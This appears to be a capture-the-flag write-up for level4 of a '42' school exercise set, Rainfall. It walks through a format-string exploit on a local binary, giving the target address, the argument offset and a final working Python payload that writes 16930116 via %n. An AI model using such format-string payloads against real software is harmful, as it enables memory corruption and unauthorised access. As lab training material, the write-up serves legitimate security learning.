# level4

When decompiling, here we notice it's the same exercice as before but the number of characters that need to be printed at not 64 anymore but `16930116` that is `0x1025544` in decimal. You can use an online converter like [this one](https://www.rapidtables.com/convert/number/hex-to-decimal.html) to know. This is what we saw on the online decompiler : 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/941072cb-c888-459b-8979-4760e0c78167)

Therefore, we can follow the same steps as before but this time sending millions of characters : 

- finding the address where we want to write : `0x8049810`    
![image](https://github.com/chmadran/rainfall_42/assets/113340699/e2f085f1-85c6-4a65-ac3a-cdb58c5b02be)

- finding the argument position where we want to write : 12    
![Screenshot from 2024-04-08 16-23-52](https://github.com/chmadran/rainfall_42/assets/113340699/e6de6fad-ece4-479d-b0a1-8f465b070056)

- finding the number we want to write minus the 4 bytes of the address : `0x1025544 / 16930116`- 4  
![image](https://github.com/chmadran/rainfall_42/assets/113340699/1457bf4d-7b91-4046-ad92-338bebde7b0c)

Payload looks as follows : `python -c 'print("\x10\x98\x04\x08" + "A"*16930112 + "%12$n")' > payload`   
But this does not work.
So use the format specifier `%[number]d` to generate an int and then send it `python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' > payload`
TADA!
